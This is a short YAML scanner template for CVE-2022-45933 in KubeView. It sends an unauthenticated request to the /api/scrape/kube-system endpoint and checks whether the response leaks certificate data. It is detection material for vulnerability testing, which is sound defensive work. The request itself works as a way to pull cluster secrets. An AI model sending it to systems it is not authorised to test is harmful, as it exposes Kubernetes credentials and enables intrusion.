name: poc-yaml-kubeview-cve-2022-45933-unauth
binding: 79c497a6-d6a0-41b2-8b69-147ec4c927c0
manual: true
detail:
    author: xiaohe
    links:
        - https://github.com/benc-uk/kubeview/issues/95
        - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-45933
    vulnerability:
        level: critical
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /api/scrape/kube-system
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("BEGIN CERTIFICATE") && response.body_string.contains("END CERTIFICATE") && response.body_string.contains("kubernetes.io")
expression: r0()
